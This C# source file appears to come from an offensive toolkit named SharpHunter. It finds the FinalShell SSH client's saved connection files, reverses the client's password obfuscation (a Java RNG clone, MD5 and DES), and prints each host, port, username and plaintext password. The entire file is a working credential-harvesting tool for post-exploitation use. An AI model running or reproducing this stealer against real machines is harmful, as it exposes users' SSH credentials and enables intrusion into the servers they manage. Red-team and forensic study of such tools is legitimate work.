using SharpHunter.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace SharpHunter.Commands
{
    public class FinalShellCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            //public string ConfigFile;
            //public string FolderName;
            public string Host;
            public int Port;
            public string UserName;
            public string Password;
            public string Path;
        }
        private const string FinalShellConnFolder = @"\finalshell\conn";
        private const string ConfigFilePattern = "*_connect_config.json";
        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by Finalshell.");
            if (args.Count == 1)
            {
                string connPath = args[0].ToString();
                GetFinalShellCred(connPath);
            }
            else
            {
                GetFinalShellCred();
            }
        }

        public static void GetFinalShellCred(string connPath = null)
        {
            Logger.TaskHeader("Hunting FinalShell", 1);
            connPath = FindFinalShellConnPath();
            if (string.IsNullOrEmpty(connPath))
            {
                Logger.WriteLine("[-] FinalShell process not found.");
                return;
            }

            if (Directory.Exists(connPath))
            {
                Logger.WriteLine($"[+] FinalShell ConnPath: {connPath}\n");
                ProcessConnFolder(connPath);
            }
            else
            {
                Logger.WriteLine("[-] Provided directory path does not exist.");
            }
        }

        public static string FindFinalShellConnPath()
        {
            string connPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + FinalShellConnFolder;

            if (Directory.Exists(connPath))
            {
                return connPath;
            }
            else
            {
                var processInfo = CommonUtils.GetProcessInfoByName("finalshell");
                if (processInfo.HasValue)
                {
                    string processConnPath = Path.Combine(Path.GetDirectoryName(processInfo.Value.FilePath), "conn");
                    return processConnPath;
                }
                else
                {
                    return null;
                }
            }
        }

        private static void ProcessConnFolder(string connPath)
        {
            var configFiles = Directory.GetFiles(connPath, ConfigFilePattern, SearchOption.AllDirectories);
            List<ConnectionInfo> connections = new List<ConnectionInfo>();

            foreach (var configFile in configFiles)
            {
                string relativePath = BuildRelativePath(configFile, connPath);
                string folderName = GetFolderName(configFile);

                string jsonContent = File.ReadAllText(configFile);
                string host = ExtractJsonValue(jsonContent, "host");
                int port = int.Parse(ExtractJsonValue(jsonContent, "port") ?? "0");
                string userName = ExtractJsonValue(jsonContent, "user_name");
                string encryptedPassword = ExtractJsonValue(jsonContent, "password");
                string password = decodePass(encryptedPassword);

                connections.Add(new ConnectionInfo
                {
                    //ConfigFile = configFile,
                    Path = relativePath,
                    //FolderName = folderName,
                    Host = host,
                    Port = port,
                    UserName = userName,
                    Password = password
                });
            }

            Logger.PrintTableFromStructs(connections);
        }

        private static string BuildRelativePath(string configFile, string connPath)
        {
            var relativePath = new StringBuilder("/");
            string directory = Path.GetDirectoryName(configFile);

            while (directory != connPath)
            {
                string folderJsonPath = Path.Combine(directory, "folder.json");
                if (File.Exists(folderJsonPath))
                {
                    string name = ExtractJsonValue(File.ReadAllText(folderJsonPath), "name");
                    if (!string.IsNullOrEmpty(name))
                    {
                        relativePath.Insert(0, $"/{name}");
                    }
                }
                directory = Directory.GetParent(directory).FullName;
            }

            return relativePath.ToString();
        }

        private static string GetFolderName(string configFile)
        {
            string directory = Path.GetDirectoryName(configFile);
            string folderJsonPath = Path.Combine(directory, "folder.json");

            if (File.Exists(folderJsonPath))
            {
                return ExtractJsonValue(File.ReadAllText(folderJsonPath), "name") ?? "Unknown";
            }

            return "Unknown";
        }


        private static string ExtractJsonValue(string json, string key)
        {
            string searchPattern = $"\"{key}\":";
            int startIndex = json.IndexOf(searchPattern);
            if (startIndex == -1)
            {
                return null;
            }

            startIndex += searchPattern.Length;
            int endIndex = json.IndexOf(',', startIndex);
            if (endIndex == -1)
            {
                endIndex = json.IndexOf('}', startIndex);
            }

            if (endIndex == -1)
            {
                return null;
            }

            string value = json.Substring(startIndex, endIndex - startIndex).Trim().Trim('"');
            return value;
        }

        public static byte[] desDecrypt(byte[] data, byte[] head)
        {
            byte[] TripleDesIV = { 0, 0, 0, 0, 0, 0, 0, 0 };
            byte[] key = new byte[8];
            Array.Copy(head, key, 8);
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            des.Key = key;
            des.IV = TripleDesIV;
            des.Padding = PaddingMode.PKCS7;
            des.Mode = CipherMode.ECB;
            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }

        public static string decodePass(string data)
        {
            if (data == null)
            {
                return null;
            }

            byte[] buf = Convert.FromBase64String(data);
            byte[] head = new byte[8];
            Array.Copy(buf, 0, head, 0, head.Length);
            byte[] d = new byte[buf.Length - head.Length];
            Array.Copy(buf, head.Length, d, 0, d.Length);
            byte[] randombytes = ranDomKey(head);
            byte[] bt = desDecrypt(d, randombytes);
            var rs = Encoding.ASCII.GetString(bt);

            return rs;
        }

        public static byte[] ranDomKey(byte[] head)
        {
            long ks = 3680984568597093857L / new JavaRng(head[5]).nextInt(127);
            JavaRng random = new JavaRng(ks);
            int t = head[0];

            for (int i = 0; i < t; ++i)
            {
                random.nextLong();
            }

            long n = random.nextLong();
            JavaRng r2 = new JavaRng(n);
            long[] ld = { head[4], r2.nextLong(), head[7], head[3], r2.nextLong(), head[1], random.nextLong(), head[2] };
            using (MemoryStream stream = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    long[] var15 = ld;
                    int var14 = ld.Length;

                    for (int var13 = 0; var13 < var14; ++var13)
                    {
                        long l = var15[var13];

                        try
                        {
                            byte[] writeBuffer = new byte[8];
                            writeBuffer[0] = (byte)(l >> 56);
                            writeBuffer[1] = (byte)(l >> 48);
                            writeBuffer[2] = (byte)(l >> 40);
                            writeBuffer[3] = (byte)(l >> 32);
                            writeBuffer[4] = (byte)(l >> 24);
                            writeBuffer[5] = (byte)(l >> 16);
                            writeBuffer[6] = (byte)(l >> 8);
                            writeBuffer[7] = (byte)(l >> 0);
                            writer.Write(writeBuffer);
                        }
                        catch
                        {
                            return null;
                        }
                    }

                    byte[] keyData = stream.ToArray();
                    keyData = md5(keyData);
                    return keyData;
                }
            }
        }

        public static byte[] md5(byte[] data)
        {
            try
            {
                MD5 md5Hash = MD5.Create();
                byte[] md5data = md5Hash.ComputeHash(data);
                return md5data;
            }
            catch
            { return null; }
        }
    }

    public sealed class JavaRng
    {
        public JavaRng(long seed)
        {
            _seed = (seed ^ LARGE_PRIME) & ((1L << 48) - 1);
        }

        public long nextLong()
        {
            return ((long)next(32) << 32) + next(32);
        }

        public int nextInt(int bound)
        {
            if (bound <= 0)
                throw new ArgumentOutOfRangeException(nameof(bound), bound, "bound must be positive");

            int r = next(31);
            int m = bound - 1;
            if ((bound & m) == 0)  // i.e., bound is a power of 2
                r = (int)((bound * (long)r) >> 31);
            else
            {
                for (int u = r;
                     u - (r = u % bound) + m < 0;
                     u = next(31))
                    ;
            }
            return r;
        }

        private int next(int bits)
        {
            _seed = (_seed * LARGE_PRIME + SMALL_PRIME) & ((1L << 48) - 1);
            return (int)((_seed) >> (48 - bits));
        }

        private long _seed;

        private const long LARGE_PRIME = 0x5DEECE66DL;
        private const long SMALL_PRIME = 0xBL;
    }
}